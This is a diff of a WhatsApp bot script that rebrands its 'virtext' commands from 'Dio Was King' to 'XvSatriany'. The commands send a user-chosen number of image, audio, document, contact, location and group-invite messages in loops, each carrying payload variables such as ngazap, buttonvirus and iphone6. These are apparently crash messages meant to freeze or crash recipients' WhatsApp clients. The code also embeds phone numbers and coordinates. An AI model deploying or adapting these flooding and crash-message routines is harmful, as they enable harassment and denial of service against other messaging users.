-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg' }, caption: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${iphone6}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg' }, caption: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${iphone6}` }, { quoted: doc })
 }
 }
 break
-case 'diovirtext8': {
+case 'bangsatvirtext8': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg' }, caption: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${buttonkal}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg' }, caption: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${buttonkal}` }, { quoted: doc })
 }
 }
 break
-case 'diovirtext9': {
+case 'bangsatvirtext9': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg' }, caption: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${buttonvirus}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg' }, caption: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${buttonvirus}` }, { quoted: doc })
 }
 }
 break
-case 'diovirtext10': {
+case 'bangsatvirtext10': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg' }, caption: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${ngazap(prefix)}`}, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg' }, caption: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${ngazap(prefix)}`}, { quoted: doc })
 }
 }
 break
@@ -602,7 +602,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "audioMessage": {
@@ -628,14 +628,14 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku Dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "imageMessage": {
 "url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
 "mimetype": "image/jpeg",
-"caption": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
+"caption": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
 "fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
 "fileLength": "42521",
 "height": 426,
@@ -657,7 +657,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -668,7 +668,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
 "pageCount": 0,
 "mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
-"fileName": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
+"fileName": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
 "fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
 "directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
 "mediaKeyTimestamp": "1657288637",
@@ -684,14 +684,14 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
-"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,
+"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,
 "matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
 "description": "Undangan Grup WhatsApp",
-"title": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
+"title": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
 "previewType": "NONE",
 }
 }), { userJid: m.chat, quoted: doc })
@@ -705,7 +705,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "stickerMessage": {
@@ -730,15 +730,15 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
-"text": "https://wa.me/c/6282264181831",
-"matchedText": "https://wa.me/c/6282264181831",
-"description": "Developer 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
-"title": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
+"text": "https://wa.me/c/17077706888",
+"matchedText": "https://wa.me/c/17077706888",
+"description": "Developer 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
+"title": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
 "previewType": "NONE",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -753,12 +753,12 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
-"displayName": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
-"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:Haikal\nitem1.TEL;waid=6282264181831:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Dio\nEND:VCARD",
+"displayName": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
+"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:Haikal\nitem1.TEL;waid=17077706888:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Dio\nEND:VCARD",
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
@@ -771,14 +771,14 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"caption": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
+"caption": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -793,14 +793,14 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"caption": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
+"caption": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: doc })
@@ -814,15 +814,15 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": `MY NAME 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
-"groupName": `MY NAME 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
+"inviteExpiration": `MY NAME 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
+"groupName": `MY NAME 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
 "caption": `${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -837,7 +837,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
